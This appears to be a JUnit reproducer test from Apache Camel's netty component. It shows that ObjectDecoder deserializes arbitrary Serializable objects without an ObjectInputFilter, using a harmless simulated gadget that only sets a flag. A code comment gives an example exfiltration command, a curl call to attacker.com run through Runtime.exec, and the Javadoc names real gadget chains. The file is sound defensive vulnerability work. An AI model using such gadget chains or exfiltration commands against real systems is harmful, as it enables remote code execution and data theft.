/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.camel.component.netty;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

import io.netty.channel.ChannelHandler;
import io.netty.handler.codec.serialization.ClassResolvers;
import org.apache.camel.BindToRegistry;
import org.apache.camel.builder.RouteBuilder;
import org.apache.camel.component.netty.codec.ObjectDecoder;
import org.apache.camel.component.netty.codec.ObjectEncoder;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Reproducer demonstrating that camel-netty TCP endpoints using ObjectDecoder perform unrestricted Java deserialization
 * without ObjectInputFilter.
 *
 * <p>
 * When ObjectDecoder is configured, ANY Serializable class sent over the wire is deserialized, including its
 * {@code readObject()} method. An attacker can exploit this to achieve remote code execution via known gadget chains
 * (e.g., Commons Collections, Spring, etc.).
 * </p>
 *
 * <p>
 * This test uses a {@link SimulatedGadget} that sets a static flag in its {@code readObject()} to prove arbitrary code
 * execution during deserialization. In a real attack, this would chain to {@code Runtime.getRuntime().exec()}.
 * </p>
 */
public class NettyUnfilteredDeserializationReproducerTest extends BaseNettyTest {

    @BindToRegistry("encoder")
    public ChannelHandler getEncoder() {
        return new ShareableChannelHandlerFactory(new ObjectEncoder());
    }

    @BindToRegistry("decoder")
    public ChannelHandler getDecoder() {
        return new DefaultChannelHandlerFactory() {
            @Override
            public ChannelHandler newChannelHandler() {
                return new ObjectDecoder(ClassResolvers.weakCachingResolver(null));
            }
        };
    }

    @BeforeEach
    void resetGadget() {
        SimulatedGadget.executed = false;
    }

    @Test
    public void testUnfilteredDeserializationAllowsArbitraryCodeExecution() {
        // An attacker sends a crafted Serializable object to the netty TCP endpoint.
        // The ObjectDecoder deserializes it without any ObjectInputFilter,
        // so SimulatedGadget.readObject() executes arbitrary code.
        SimulatedGadget gadget = new SimulatedGadget();

        template.requestBody(
                "netty:tcp://localhost:{{port}}?sync=true&encoders=#encoder&decoders=#decoder",
                gadget, Object.class);

        assertTrue(SimulatedGadget.executed,
                "SimulatedGadget.readObject() was called during deserialization, "
                                             + "proving unrestricted deserialization allows arbitrary code execution. "
                                             + "An ObjectInputFilter should reject unknown classes.");
    }

    @Override
    protected RouteBuilder createRouteBuilder() {
        return new RouteBuilder() {
            @Override
            public void configure() {
                from("netty:tcp://localhost:{{port}}?sync=true&decoders=#decoder&encoders=#encoder")
                        .process(exchange -> {
                            Object body = exchange.getIn().getBody();
                            exchange.getMessage().setBody("received: " + body.getClass().getName());
                        });
            }
        };
    }

    /**
     * Simulates a deserialization gadget. In a real attack this would be a class from a library on the classpath (e.g.,
     * commons-collections InvokerTransformer) that chains to {@code Runtime.getRuntime().exec("malicious command")}.
     *
     * <p>
     * Here we simply set a static flag to prove that {@code readObject()} runs during deserialization -- i.e.,
     * arbitrary code execution is possible.
     * </p>
     */
    public static class SimulatedGadget implements Serializable {
        private static final long serialVersionUID = 1L;

        static volatile boolean executed;

        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            // In a real gadget chain this would be:
            //   Runtime.getRuntime().exec("curl http://attacker.com/steal?data=...");
            executed = true;
        }
    }
}
